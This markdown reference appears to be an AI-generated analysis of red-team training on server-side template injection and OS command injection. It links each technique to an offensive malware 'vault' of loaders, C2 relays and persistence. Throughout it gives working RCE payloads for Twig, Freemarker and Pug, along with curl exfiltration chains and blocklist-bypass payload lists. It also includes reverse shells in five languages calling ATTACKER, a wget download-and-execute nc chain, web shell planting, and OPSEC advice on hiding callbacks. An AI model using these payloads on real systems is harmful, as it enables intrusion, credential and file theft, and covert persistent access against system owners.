---
id: RTO-web-app-injection
name: Web Application Injection (SSTI & OS Command Injection)
source: Red Team Ops / Zero-Point Security (OSWA-aligned material)
category: c2-infrastructure
analyzed_by: glm-5.2
analysis_date: 2026-07-21
vault_references: [T019, T021, T022, T023]
tags: [ssti, command-injection, twig, freemarker, jinja, pug, handlebars, mustache, initial-access, web-shell, reverse-shell, payload-delivery, exfiltration]
---

# Web Application Injection (SSTI & OS Command Injection) — Training Reference

## TL;DR
This module covers two distinct pre-foothold attack surfaces that operators use during initial access or web-facing pivot: Server-Side Template Injection (SSTI) across Twig, Freemarker, Pug, Jinja, Handlebars/Mustache, and OS Command Injection with bypass tradecraft (null-statement injection, base64 wrapping, blind time-based confirmation). The end state is shell — the training culminates in reverse shell delivery and basic web shell planting — which directly feeds the payload acquisition phase of the vault's dark_crystal loader (`T022`). The training is Linux/web-stack focused; the vault is Windows-native, so the cross-value is at the initial-access/payload-delivery boundary, not in the evasion layer.

## Key Concepts

1. **Templating Engine Anatomy (statements / expressions / filters)** — Templates separate view from controller but vary in "logicalness": logic-less engines (Mustache, Handlebars) only allow display primitives, while logical engines (Twig, Freemarker, Pug) expose filters, arrow functions, and class instantiation that bridge to the underlying language. Logical engines have a larger RCE surface post-injection.

2. **Server-Side vs Client-Side Rendering** — SSTI into server-side rendering (Twig/Freemarker/Pug/Jinja on the backend) can reach RCE; client-side rendering (Handlebars.js in browser) caps at XSS. Always fingerprint which side renders before pursuing RCE payloads.

3. **SSTI Discovery Triad** — Discovery of injection point → fingerprint engine via arithmetic type-coercion behavior (e.g., `5*"5"` returns `55555` in Python/Jinja, errors in Java/Freemarker, returns `25` in PHP/Twig) → exploit using engine-specific RCE primitive. Type-coercion fingerprinting is the single highest-signal black-box technique taught.

4. **Delimiter Recognition is Not Fingerprinting** — Most engines allow custom delimiters, so `{{ }}` alone doesn't confirm Twig vs Jinja vs Handlebars. Use arithmetic + type coercion + framework global variables (`config`, `request`, `session`, `g`, `url_for()`, `get_flashed_messages()` for Flask/Jinja) to confirm.

5. **Filter-as-RCE-Primitive** — In logical engines, `reduce`/`map`/`sort`/`filter` filters accept arrow functions or callable names. In Twig, `{{[0]|reduce('system','whoami')}}` chains a callable name into `system()`. This is the canonical SSTI→RCE pivot for Twig and is reusable for blind exfil.

6. **Class Instantiation via `?new()` (Freemarker)** — Freemarker exposes `freemarker.template.utility.Execute` (implements `TemplateModel`) instantiable via `${"freemarker.template.utility.Execute"?new()("whoami")}`. The Freemarker FAQ literally documents this attack surface.

7. **Global Object Pivot (Pug/NodeJS)** — When `require` is not directly accessible in Pug, `global.process.mainModule.require` re-exposes it; from there, `require('child_process').spawnSync('whoami').stdout` reaches RCE. Buffered code (`=`) displays output; unbuffered (`-`) does not.

8. **Command Chaining Operators** — `;` (sequential), `&&` (AND), `||` (OR), `|` (pipe), newline `\n` (0x0A), backtick `` `cmd` `` and `$(cmd)` (inline execution). The vault's payload acquisition stage (`T022 transport.rs` and `winhttp_dl.rs`) is the Windows analog of the Linux one-liner delivery taught here.

9. **Null-Statement Injection Bypass (`$()`)** — `$()` evaluates to NULL and is inserted between characters of a blocklisted keyword (e.g., `wh$()oami`, `n$()c`, `i$()d`). This defeats naive substring blocklists and is one of the most reusable blocklist bypasses in Linux web stacks.

10. **Blind OS Command Injection Confirmation** — When output is not returned, time-based confirmation via `;sleep 20` measured with `time curl` is the canonical OOB-equivalent. Out-of-band exfil via `curl http://ATTACKER/?exfil=...` to a Python HTTP server is the second confirmation tier.

11. **URL Encoding is Non-Optional** — Bad characters (`&`, `;`, spaces, `'`, `"`) must be URL-encoded for the web server (Apache/Nginx) to interpret the payload as a single parameter. Burp "URL Encode Key Characters" is the operator's primary normalization tool.

12. **Base64-Wrapped Bypass** — `echo "cat /etc/passwd" | base64` → `;`echo <B64> | base64 -d`` defeats blocklists entirely when backticks are permitted. Useful when null-statement injection is itself blocked.

13. **Capability Enumeration Before Payload Throw** — Before throwing a reverse shell, run `which` against `wget`, `curl`, `nc`, `socat`, `python`, `python3`, `perl`, `php`, `gcc`, `cc`, `bash` to enumerate what's available. Wfuzz with `--hc 404 --hh <bogus_size>` filters results efficiently. This mirrors the vault's recon stage (`T023 byakugan.rs` — ARP/TCP/AD enum).

14. **Web Shell Limitation** — PHP `passthru($_GET['cmd'])` shells lack shell environment state (`cd` doesn't persist between requests), so they are staging tools, not final footholds. Always upgrade to a full reverse shell. This is the same principle as the vault's loader phase separation (`T022 runner.rs` multi-phase 0-6+).

15. **Authenticated SSTI is Common** — Both real-world case studies (Halo CMS CVE-2020-21523, Craft CMS + Sprout Forms CVE-2020-11056) required authenticated access to template editors. Authenticated template editor access is a prime SSTI hunting ground.

## Operational Techniques

### Twig SSTI — Discovery and RCE

- **What**: PHP/Symfony templating engine; RCE via `reduce` filter accepting callable name.
- **When to use**: PHP web apps with template rendering (email templates, theme editors, PDF generators). Discovery via authenticated template editor or user-controlled string concat into template source.
- **How**:
  1. Confirm Twig via arithmetic coercion: `{{5*5}}` → `25`, `{{5*'5'}}` → `25` (PHP weakly typed).
  2. Confirm via `-` whitespace-trim delimiter: `{%- if true %}  text  {%- endif %}` strips spaces.
  3. RCE primitive via `reduce` filter (accepts arrow function name): `{{[0]|reduce('system','whoami')}}`.
  4. Alternative: `var_dump` for confirmation `{{[0]|reduce('var_dump','Hello')}}`.
  5. Blind exfil payload (when output not visible): `{{[0]|reduce('system','curl http://ATTACKER/?exfil=' ~ exfil)}}`.
  6. Multi-line command + URL-encode for exfil:
     ```
     {% set output %}{{[0]|reduce('system','whoami')}}{% endset %}
     {% set exfil = output| url_encode %}
     {{[0]|reduce('system','curl http://ATTACKER/?exfil=' ~ exfil)}}
     ```
- **Vault link**: No direct vault equivalent. Closest analog is `T022 henge.rs` (malleable C2 profile engine) — both encode payloads into a host-language shape (Twig template vs C2 profile) to evade signature detection. Twig's filter-as-callable pattern is the web-stack analog of the vault's indirect syscall dispatch (`T001 RecycledGate`) — both reach a privileged primitive via an indirect, signature-evading path.
- **Tool/code**:
  - Sandbox: `http://template-sandbox/twig`
  - RCE: `{{[0]|reduce('system','whoami')}}`
  - Exfil chain: see Listing 56 in source (set/output/url_encode/curl)
- **OPSEC**: Twig payloads land in application logs and may crash on type errors (500). Blind exfil via `curl` generates outbound HTTP — ensure operator HTTP server is on a non-attributed IP or routed through the vault's `T019` peer relay (`juubi.rs`) for tradecraft concealment. The `~` (tilde) concatenation operator is Twig-specific and a fingerprint itself.

### Apache Freemarker SSTI — Discovery and RCE

- **What**: Java templating engine (often paired with Spring/Jakarta); RCE via `?new()` on `freemarker.template.utility.Execute`.
- **When to use**: Java web apps with `.ftl` template files, theme editors, or `${...}` expression markers in output. Java's strict typing makes discovery deterministic.
- **How**:
  1. Identify `${...}` delimiter usage in output (e.g., `${static!}` rendered as `http://halo/anatole`).
  2. Confirm via arithmetic + type error: `${5*5}` → `25`; `${5*'5'}` → HTTP 500 (Java strict typing crashes).
  3. RCE payload (class instantiation):
     ```
     ${"freemarker.template.utility.Execute"?new()("whoami")}
     ```
  4. For file read: `${"freemarker.template.utility.Execute"?new()("cat /etc/passwd")}`.
  5. XSS note: Freemarker auto-escapes only post-2016 and only for HTML content-type; pre-2016 / non-HTML templates → direct XSS via `<i>Ofira</i>`-style injection.
- **Vault link**: No direct equivalent. The `?new()` class-instantiation primitive is conceptually parallel to the vault's `T014 NtCreateUserProcess` (direct NT process creation bypassing Win32) — both reach a privileged primitive through an unconventional constructor path that bypasses the "normal" user-facing API surface.
- **Tool/code**:
  - Sandbox: `http://template-sandbox/freemarker`
  - RCE: `${"freemarker.template.utility.Execute"?new()("whoami")}`
  - Class list: https://freemarker.apache.org/docs/api/
- **OPSEC**: `${5*'5'}` will crash the entire application (HTTP 500) — high detection risk. Restrict type-error probing to non-critical templates. Reverse shell requires escaping Freemarker sandbox configuration (operator should check `setNewBuiltinClassResolver` policy).

### Pug (Jade) SSTI — Discovery and RCE

- **What**: JavaScript templating engine for NodeJS/Express; RCE via `global.process.mainModule.require('child_process').spawnSync(...).stdout`.
- **When to use**: NodeJS apps, especially Express-based. Pug's syntax (first word of line = HTML tag) is highly distinctive.
- **How**:
  1. Discover via `#{"7"*7}` — Pug wraps output in HTML tags → `<49>` (other engines return `49`).
  2. Confirm tag-wrapping behavior: any line's first word becomes the tag.
  3. Test `require` access directly (likely empty/blocked).
  4. Pivot via global: `- var require = global.process.mainModule.require`.
  5. Import child_process: `= require('child_process')` → outputs `[object Object]` (confirms import).
  6. Execute command:
     ```
     - var require = global.process.mainModule.require
     = require('child_process').spawnSync('whoami').stdout
     ```
  7. Buffered code (`=`) prints output; unbuffered code (`-`) does not.
- **Vault link**: No direct equivalent. The `global.process.mainModule.require` pivot is conceptually similar to the vault's `T004 PEB Walker` (manual module resolution via `gs:[0x60]`) — both reach a privileged resolution primitive by walking an internal structure when the "normal" API surface is restricted.
- **Tool/code**:
  - Sandbox: `http://template-sandbox/pug`
  - NodeJS command exec docs: `child_process.spawnSync`
- **OPSEC**: Pug server-side rendering typically runs as the NodeJS process user (often root in misconfigured Docker — case study shows root). `spawnSync` is blocking and logs child process spawn. For stealthier execution, prefer `exec` async or route through `T022 juubi.rs` peer relay for outbound traffic.

### Jinja SSTI — Discovery and Information Disclosure

- **What**: Python templating engine (Flask); RCE possible but complex (covered in WEB-300). This training limits to discovery + sensitive config exfil.
- **When to use**: Python/Flask web apps. Jinja's strict typing makes discovery trivial.
- **How**:
  1. Confirm via arithmetic coercion: `{{5*5}}` → `25`; `{{5*"5"}}` → `55555` (Python repeats string — unique behavior).
  2. Confirm Flask framework via global variables: `{{ request }}` → returns request object (Flask sets `config`, `request`, `session`, `g`, `url_for()`, `get_flashed_messages()`).
  3. Exfil application secrets: `{{config|pprint}}` → exposes SECRET_KEY (used to decrypt session cookies, etc.).
  4. RCE payloads are intentionally not covered (deferred to WEB-300) — operator should consult PayloadsAllTheThings Jinja2 RCE section for production work.
- **Vault link**: Closest analog is `T021 crypto-obfuscation.md` (config embedding, `build.rs` `.env` embedding) — both expose secrets via misconfigured build/runtime config. The Flask `SECRET_KEY` disclosure is the web-stack equivalent of leaking the vault's `selection_config.rs` `include_str!` YAML.
- **Tool/code**:
  - Sandbox: `http://template-sandbox/jinja`
  - Discovery: `{{5*"5"}}` → `55555`
  - Framework fingerprint: `{{ request }}`
  - Secret exfil: `{{config|pprint}}`
- **OPSEC**: `config|pprint` dumps all Flask config including potential DB credentials — high-value but logged. Use blind OOB exfil (similar to Twig `curl` payload) if direct output is not visible.

### Handlebars/Mustache SSTI — Discovery and File Read

- **What**: Logic-less templating engines; RCE generally not possible without added helpers. File read via `handlebars-helpers` repo's `read` and `readdir` helpers.
- **When to use**: JavaScript apps using `handlebars.js` (or Java/.NET/PHP Handlebars ports). Discovery via tag wrapping behavior and helper presence.
- **How**:
  1. Recognize `{{...}}` expressions and `{{#if}}`/`{{#each}}` block helpers.
  2. Confirm Handlebars (not Mustache) via block helper syntax `{{#each nicknames}}{{this}}{{/each}}` — Mustache uses `{{#nicknames}}...{{/nicknames}}` only.
  3. Test for `handlebars-helpers` integration:
     ```
     {{#readdir '/etc/'}}{{this}}{{/readdir}}
     ```
  4. File read:
     ```
     {{read '/etc/passwd'}}
     ```
  5. Target server-side rendering (`/handlebars_remote`) — client-side rendering cannot access filesystem.
- **Vault link**: No direct equivalent. The `handlebars-helpers` library supplying dangerous helpers is the web-stack analog of importing a vulnerable crate in the vault's dependency map (`architecture/dependency-map.md`) — both expand the attack surface via third-party code that exposes primitives the core engine deliberately restricts.
- **Tool/code**:
  - Sandbox: `http://template-sandbox/handlebars_remote`
  - Helper repo: https://github.com/helpers/handlebars-helpers
- **OPSEC**: `readdir` and `read` helpers produce no application error on missing files — useful for blind enumeration. Read output is logged in app logs.

### SSTI Case Study — Halo CMS (CVE-2020-21523)

- **What**: Authenticated Freemarker SSTI in Halo CMS theme editor (`*.ftl` files), reaching RCE as root in a containerized environment.
- **When to use**: Halo CMS engagements with admin credentials (default `admin:password`).
- **How**:
  1. Add `192.168.50.105 halo` to `/etc/hosts`.
  2. Login at `http://halo/admin` with `admin:password`.
  3. Install Google Translate Chromium extension (Halo is Chinese-only by default).
  4. Navigate to theme editor, select `404.ftl`.
  5. Confirm Freemarker: `${5*5}` → `25`; `${5*'5'}` → HTTP 500.
  6. Render via `curl -L http://halo/DoesNotExist`.
  7. RCE payload appended to `404.ftl`:
     ```
     ${"freemarker.template.utility.Execute"?new()("cat /etc/passwd")}
     ```
  8. Retrieve via `curl -L http://halo/DoesNotExist`.
- **Vault link**: No direct equivalent. The authenticated template editor attack surface parallels the vault's `T017 persistence-suite.md` COM hijack persistence — both abuse an admin-reachable configuration store to plant attacker-controlled code that executes in a privileged context.
- **Tool/code**: `curl -L http://halo/DoesNotExist` (renders 404.ftl), Freemarker RCE payload (Listing 45).
- **OPSEC**: Modifying `404.ftl` is durable — operator must restore original content post-engagement to avoid detection. Halo runs in container as root by default — high-impact but high-attribution.

### SSTI Case Study — Craft CMS + Sprout Forms (CVE-2020-11056, Blind)

- **What**: Blind Twig SSTI via Sprout Forms email template; exfil via OOB HTTP callback.
- **When to use**: Craft CMS engagements with Sprout Forms plugin. Output is invisible (email never sent on error) so OOB confirmation is mandatory.
- **How**:
  1. Add `192.168.50.105 craft` to `/etc/hosts`.
  2. Confirm Craft CMS via CSRF token name and `name="..."` PHP-style brackets in HTML.
  3. Run gobuster: `gobuster dir --wordlist /usr/share/wordlists/dirb/common.txt --url http://craft/` → discover `/admin`, `/index`, `/logout`.
  4. Submit contact form on home page; check SMTP catcher on port 8025 to receive confirmation email.
  5. Inject `{{5*5}}` — no email received (template crash → blind SSTI).
  6. OOB confirmation: `{{[0]|reduce('system','curl http://ATTACKER/helloFromTheOtherSide')}}` with `python3 -m http.server 80` on attacker.
  7. Build exfil payload (URL-encoded multi-line):
     ```
     {% set output %}{{[0]|reduce('system','cat /etc/passwd')}}{% endset %}
     {% set exfil = output| url_encode %}
     {{[0]|reduce('system','curl http://ATTACKER/?exfil=' ~ exfil)}}
     ```
  8. Submit via contact form; read exfil in HTTP server log; URL-decode in Burp Decoder.
- **Vault link**: The blind OOB exfil pattern is the web-stack analog of `T019 edo-dead-drop.md` (autonomous C2 via Google Translate / blockchain / steganography) — both exfil data through an indirect, app-logged-but-not-app-displayed channel. The vault's `discovery.rs` (server URL discovery via `rentry.co` + Sepolia contract) is a more advanced version of the same OOB confirmation pattern.
- **Tool/code**:
  - `gobuster dir --wordlist /usr/share/wordlists/dirb/common.txt --url http://craft/`
  - SMTP catcher on port 8025
  - Burp Decoder (URL decode)
  - Twig reduce-filter exfil chain
- **OPSEC**: Outbound `curl` from target to attacker HTTP server is the primary detection surface. For operational use, route through the vault's `T022 kamui.rs` SOCKS5 proxy or `T019 juubi.rs` peer relay chain to obfuscate the callback source.

### OS Command Injection — Discovery and Chaining

- **What**: Injection of OS commands via unsanitized user input to a system call (`system()`, `exec()`, `shell_exec()`, `passthru()`, `popen()` in PHP; `child_process.exec` in Node; `os.system`/`subprocess` in Python).
- **When to use**: Any web app parameter that influences a shell command (ping, netstat, ls, net user, file conversion, etc.). Classic payloads: `;id`, `|id`, `` `id` ``, `$(id)`.
- **How**:
  1. Identify suspect endpoint (e.g., `?ip=127.0.0.1` → ping output).
  2. Inject `|id` to verify chaining works.
  3. Use chaining operators as needed:
     - `;` — sequential
     - `&&` — second runs only if first succeeds
     - `||` — second runs only if first fails
     - `|` — pipe output to second command
     - `` `cmd` `` or `$(cmd)` — inline execution
     - `\n` (0x0A) — newline separator
  4. For reverse shell payload, wrap in `bash -c '...'` to handle bad chars: `bash -c 'bash -i >& /dev/tcp/192.168.49.51/9090 0>&1'`.
  5. URL-encode via Burp "URL Encode Key Characters" — `&` and `;` especially.
- **Vault link**: The reverse shell delivery taught here is the Linux analog of the vault's `T022 winhttp_dl.rs` (WinHTTP staged download) and `T019 tcp_transport.rs`. Both serve the same operational purpose: deliver the next-stage payload (vault's `dark_crystal` loader) to the freshly-compromised host. The vault's `T021 obfuscation` shellcode encoders (IPv4/IPv6/MAC/UUID/words) are the Windows-side analog of the base64-wrap bypass taught here.
- **Tool/code**:
  - Sandbox: `http://ci-sandbox:80/`
  - Chaining examples: Listing 5-11
  - Bash rev shell wrap: `bash -c 'bash -i >& /dev/tcp/ATTACKER/9090 0>&1'`
- **OPSEC**: Initial `id`/`whoami` probe is the noisiest single action (visible in app logs). Use null-statement injection (`wh$()oami`) when blocklists are present. Avoid `&&`/`||` if error output is logged separately.

### Blocklist Bypass — Null Statement Injection

- **What**: Inserting `$()` (evaluates to NULL) between characters of a blocklisted keyword to evade substring matching.
- **When to use**: When `whoami`, `id`, `nc`, `cat`, etc. are blocklisted by the application. Confirms blocklist is naive substring match, not regex or AST-based.
- **How**:
  1. Test direct injection — `127.0.0.1;whoami` returns "Blocklisted Strings" error.
  2. Insert `$()`: `127.0.0.1;wh$()oami` — Linux evaluates `wh$()oami` as `whoami`.
  3. Generalize: `n$()c`, `i$()d`, `c$()at`, etc.
  4. Wfuzz with custom wordlist:
     ```
     wfuzz -c -z file,/home/kali/command_injection_custom.txt --hc 404 --hh 1156 http://ci-sandbox:80/php/blocklisted.php?ip=127.0.0.1FUZZ
     ```
  5. Custom wordlist entries (from Listing 18):
     ```
     bogus
     ;id
     |id
     `id`
     i$()d
     ;i$()d
     |i$()d
     FAIL||i$()d
     &&id
     &id
     FAIL_INTENT|id
     FAIL_INTENT||id
     `sleep 5`
     `sleep 10`
     `id`
     $(sleep 5)
     $(sleep 10)
     $(id)
     ;`echo 'aWQK' |base64 -d`
     FAIL_INTENT|`echo 'aWQK' |base64 -d`
     FAIL_INTENT||`echo 'aWQK' |base64 -d`
     ```
- **Vault link**: The null-statement injection is the web-stack analog of the vault's `T006 Phantom Stubs` (MEM_IMAGE-backed syscall stubs) — both evade signature matching by inserting semantically-null but syntactically-valid content into a recognizable pattern.
- **Tool/code**:
  - `wfuzz -c -z file,<list> --hc 404 --hh <bogus_size> <url>FUZZ`
  - `wh$()oami`, `n$()c -n$()lvp 9090`
- **OPSEC**: `$()` itself is not blocked by most blocklists. Wfuzz scans generate predictable traffic patterns — use `--hh` filtering to minimize requests (the bogus baseline is essential). The custom wordlist is intentionally short for OPSEC.

### Blocklist Bypass — Base64 Wrap

- **What**: Base64-encode the entire payload and pipe through `base64 -d` via backticks to evade any substring blocklist.
- **When to use**: When null-statement injection is also blocked but backticks (`) are permitted.
- **How**:
  1. Encode: `echo "cat /etc/passwd" | base64` → `Y2F0IC9ldGMvcGFzc3dkCg==`.
  2. Inject: `127.0.0.1;`echo "Y2F0IC9ldGMvcGFzc3dkCg==" | base64 -d``.
  3. URL-encode backticks and pipes: `;`echo%20%22Y2F0...%22%20|base64%20-d``.
- **Vault link**: Direct parallel to `T021 crypto-obfuscation.md` shellcode encoding (IPv4/IPv6/MAC/UUID/words) — both encode a payload into a benign-looking representation that the target decodes back to its original form. The vault's encoders are for shellcode; this is for ASCII command strings, but the principle is identical.
- **Tool/code**: `echo "<cmd>" | base64` then `` `echo "<b64>" | base64 -d` ``
- **OPSEC**: `base64 -d` invocation in process list is a known malicious pattern — Wfuzz/tradecraft detection may flag it. Consider `openssl enc -d -base64` as alternative.

### Blind OS Command Injection — Time-Based Confirmation

- **What**: Confirming command execution when no output is returned, by injecting `sleep N` and measuring response time delta.
- **When to use**: Endpoints that execute commands but suppress output (e.g., `blind.php` that returns only "Host is UP/DOWN").
- **How**:
  1. Baseline: `time curl http://target/endpoint?param=value` (e.g., 10s baseline when host down).
  2. Inject sleep: `time curl "http://target/endpoint?param=value;sleep%2020"`.
  3. If response time = baseline + sleep duration (30s = 10s + 20s), blind injection confirmed.
  4. Upgrade to OOB exfil via `curl http://ATTACKER/?exfil=$(cmd)`.
- **Vault link**: Time-based confirmation is the web-stack analog of the vault's `T020 anti-analysis.md` API hammering (FPU/SIMD 3M iterations) — both use measurable timing side-channels to confirm execution when direct output is suppressed. Also parallels `T005 ekko-rop-sleep.md` in that timing is the observable.
- **Tool/code**: `time curl "http://target/endpoint?param=value;sleep%2020"`
- **OPSEC**: `sleep 20` in process list is a known IoC. Use `sleep $((20))` or `ping -c 20 127.0.0.1` as alternatives.

### Capability Enumeration via Wfuzz

- **What**: Enumerating available Linux/Windows binaries on target via `which` + Wfuzz, using response-size filtering to identify present binaries.
- **When to use**: Immediately after first command injection confirmation, before throwing reverse shell or payload delivery.
- **How**:
  1. Build wordlist (`/home/kali/capability_checks_custom.txt`):
     ```
     w00tw00t
     wget curl fetch gcc cc nc socat ping netstat ss ifconfig ip hostname php python python3 perl java
     ```
  2. Wfuzz: `wfuzz -c -z file,<list> --hc 404 "http://target/endpoint?param=127.0.0.1;which FUZZ"`
  3. Identify bogus baseline size (~491 bytes for `w00tw00t`).
  4. Anything > baseline + small delta (e.g., >495 bytes) = binary present.
  5. Linux target capabilities enumerated in case study:
     ```
     cc gcc php perl python python3 hostname nc netstat curl wget ping ifconfig
     ```
  6. Windows capability list (Table 2):
     ```
     PowerShell, Visual Basic, tftp, ftp, certutil, Python, .NET, ipconfig, netstat, hostname, systeminfo
     ```
- **Vault link**: The capability enumeration is the Linux/web analog of the vault's `T023 byakugan.rs` (network recon — ARP, TCP, AD enum) and `T020 anti-analysis.md` `kaguya.rs` (LOtL binary inventory + EDR detection). All three enumerate the target's available toolset before committing to a payload strategy. The vault's `kaguya.rs` is the more advanced version — it inventories LOtL binaries *and* detects EDR presence, whereas the training here only inventories.
- **Tool/code**: `wfuzz -c -z file,<list> --hc 404 "http://target?ip=127.0.0.1;which FUZZ"`
- **OPSEC**: `which` invocation is benign-looking. Wfuzz produces 19 requests in the example — fast and low-volume. Filter aggressively to avoid noise.

### Reverse Shell Delivery — Multi-Language

- **What**: One-liner reverse shell payloads in Bash, Python, PHP, Perl, NodeJS for use after command injection confirmation.
- **When to use**: After capability enumeration confirms target language runtime availability.
- **How** (per language, all require `nc -nlvp 9090` on attacker):
  1. **Bash**: `bash -i >& /dev/tcp/ATTACKER/9090 0>&1` (URL-encoded, wrap in `bash -c '...'` for bad char mitigation).
  2. **Python**:
     ```
     python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER",9090));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
     ```
  3. **PHP** (variants):
     ```
     php -r '$sock=fsockopen("ATTACKER",9090);exec("/bin/sh -i <&3 >&3 2>&3");'
     php -r '$sock=fsockopen("ATTACKER",9090);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
     php -r '$sock=fsockopen("ATTACKER",9090);system("/bin/sh -i <&3 >&3 2>&3");'
     php -r '$sock=fsockopen("ATTACKER",9090);passthru("/bin/sh -i <&3 >&3 2>&3");'
     php -r '$sock=fsockopen("ATTACKER",9090);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
     ```
     - `exec()` runs program; `shell_exec()` returns string output; `system()` displays output; `passthru()` displays raw; `popen()` opens process file pointer.
  4. **Perl**:
     ```
     perl -e 'use Socket;$i="ATTACKER";$p=9090;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
     ```
  5. **NodeJS** (two-stage — write JS file then execute):
     ```
     echo "require('child_process').exec('nc -nv ATTACKER 9090 -e /bin/bash')" > /var/tmp/offsec.js ; node /var/tmp/offsec.js
     ```
- **Vault link**: This is the Linux-side analog of the vault's `dark_crystal` dropper/loader chain. Specifically:
  - The PHP `fsockopen` + `exec` pattern parallels `T022 winhttp_dl.rs` (WinHTTP staged download) — both establish an outbound socket then exec a payload.
  - The NodeJS two-stage (write file → execute) parallels the vault's `T022 runner.rs` multi-phase runner (phase 0-6+) — both separate payload acquisition from execution for OPSEC.
  - The Perl `open(STDIN,">&S")` descriptor duplication is the unix analog of the vault's `T007 process-injection.md` handle duplication techniques.
- **Tool/code**: See above; `nc -nlvp 9090` on attacker; URL-encode all payloads.
- **OPSEC**: Shells from `system()`/`passthru()` run as the web server user (commonly `www-data`). NodeJS shells may run as root in misconfigured Docker. All one-liners generate a child process — detectable via `ps`. Upgrade to T022 staged delivery (`dark_crystal` payload) ASAP to leave the web stack behind. Consider `python -c 'import pty; pty.spawn("/bin/bash")'` for TTY upgrade.

### File Transfer via wget

- **What**: Use `wget` (if present) to download `nc` binary from attacker-controlled Apache server, then exec for reverse shell — useful when no shell one-liner works due to hardening.
- **When to use**: When `nc`/`bash -i`/etc. are blocked or unavailable, but `wget` exists.
- **How**:
  1. Confirm `wget` exists: `?ip=127.0.0.1;which wget` → `/usr/bin/wget`.
  2. On attacker: `sudo cp /bin/nc /var/www/html/` then `sudo service apache2 start`.
  3. Payload (single line, three commands chained):
     ```
     wget http://ATTACKER:80/nc -O /var/tmp/nc ; chmod 755 /var/tmp/nc ; /var/tmp/nc -nv ATTACKER 9090 -e /bin/bash
     ```
  4. URL-encode and submit.
- **Vault link**: Direct parallel to `T022 winhttp_dl.rs` (WinHTTP staged download) and `T021 obfuscation/main.rs` (shellcode extraction). Both serve files from an attacker HTTP server to the compromised host. The vault's version uses WinHTTP API directly (no `wget.exe` dependency on Windows); this Linux version uses `wget` binary.
- **Tool/code**: `wget http://ATTACKER/nc -O /var/tmp/nc ; chmod 755 /var/tmp/nc ; /var/tmp/nc -nv ATTACKER 9090 -e /bin/bash`
- **OPSEC**: Apache access log on attacker records the GET request for `/nc`. Consider routing through `T019 juubi.rs` peer relay or pre-staging via `T022 henge.rs` malleable C2 profile to blend with legitimate traffic. Binary on disk at `/var/tmp/nc` is a detection artifact — clean up post-engagement.

### Web Shell Planting (PHP passthru)

- **What**: Writing a `<?php passthru($_GET['cmd']); ?>` web shell to the document root via command injection, then executing commands via HTTP GET parameter.
- **When to use**: When reverse shell is unstable or blocked, but PHP is available and document root is writable.
- **How**:
  1. Find document root: `?ip=127.0.0.1;pwd` → `/var/www/html/php`.
  2. Write web shell:
     ```
     echo "<pre><?php passthru(\$_GET['cmd']); ?></pre>" > /var/www/html/webshell.php
     ```
  3. URL-encode and submit.
  4. Use: `http://target/webshell.php?cmd=ls -lsa`.
  5. **Limitation**: `cd` does not persist between requests (no shell environment state).
- **Vault link**: The web shell is the web-stack analog of `T008 persistence-suite.md` (5-layer persistence) — both plant a durable, callable execution primitive on the target. The web shell is layer-0 (single file, no resilience); the vault's persistence suite is layer-5 (COM hijack + NTFS EA + schtask + TLS callback + PhantomPersist + resilience monitor). For operational use, immediately upgrade web shell → reverse shell → vault payload → vault persistence chain.
- **Tool/code**: `echo "<pre><?php passthru(\$_GET['cmd']); ?></pre>" > /var/www/html/webshell.php`
- **OPSEC**: Web shell file in document root is a high-confidence IoC — file integrity monitoring, web root scanning, and WAF rules all flag `passthru($_GET[...])`. Use only as short-lived staging. Consider `T017 persistence-suite.md` techniques for durable access instead.

### Case Study — OpenNetAdmin v18.1.1

- **What**: Authenticated command injection in OpenNetAdmin (ONA) IPAM system, exploitable with default `admin:admin` credentials.
- **When to use**: ONA engagements; default credentials are commonly unchanged.
- **How** (case study truncated in source, but pattern established):
  1. Add `192.168.50.105 opennetadmin` to `/etc/hosts`.
  2. Browse `http://opennetadmin:80/ona/`.
  3. Login as `admin:admin`.
  4. Discover Nmap scan functionality in Services/Associated hosts.
  5. (Source truncates — operator should consult ONA v18.1.1 CVE details for the specific injection point in `nmap` parameter handling.)
- **Vault link**: No direct equivalent; case study is engagement-specific. The pattern (default creds → authenticated functionality → injection) parallels the vault's intended use of `T017 privilege-escalation` UAC bypass — both abuse authenticated access to reach a privileged primitive.
- **Tool/code**: `/etc/hosts` entry; default creds `admin:admin`.
- **OPSEC**: Authenticated actions under `admin` account are logged with username. Default credential login is a known IoC.

## Tool & Tradecraft Reference

| Tool/Command | Purpose | OPSEC Notes |
|---|---|---|
| `gobuster dir --wordlist /usr/share/wordlists/dirb/common.txt --url <url>` | Directory enumeration on web target | Generates many 404s; use `--status-code` filter |
| `wfuzz -c -z file,<list> --hc 404 --hh <size> <url>FUZZ` | Custom wordlist fuzzing with response filtering | Filter aggressively; bogus baseline essential |
| `python3 -m http.server 80` | OOB exfil catch / file server | Logs all GETs; bind to non-attributed IP |
| `nc -nlvp 9090` | Reverse shell listener | Use non-standard ports in prod; `-n` avoids DNS logs |
| `time curl <url>` | Time-based blind injection confirmation | Compare deltas; baseline first |
| `echo "<cmd>" \| base64` | Encode payload to evade blocklist | `base64 -d` in process list is IoC |
| Burp Suite "URL Encode Key Characters" | Normalize payload for web server | Essential for `&`, `;`, spaces |
| Burp Suite Decoder (URL) | Decode exfil data from HTTP logs | Use on `?exfil=` parameter values |
| `sudo cp /bin/nc /var/www/html/ && sudo service apache2 start` | Stage nc binary on attacker HTTP server | Apache logs are OPSEC concern |
| `which <binary>` | Capability enumeration | Benign-looking; safe for recon |
| `curl -L http://target/DoesNotExist` | Render Freemarker SSTI payload in Halo | Renders 404.ftl; logs 404 |
| Google Translate Chromium extension | Translate Halo CMS (Chinese-only) | Adds browser fingerprint |
| `{{[0]\|reduce('system','whoami')}}` | Twig SSTI RCE | Twig-specific; logged in app |
| `${"freemarker.template.utility.Execute"?new()("whoami")}` | Freemarker SSTI RCE | Uses documented Freemarker class |
| `- var require = global.process.mainModule.require` then `= require('child_process').spawnSync('whoami').stdout` | Pug SSTI RCE | Accesses Node global object |
| `{{config\|pprint}}` | Jinja secret exfil (Flask) | Dumps all Flask config |
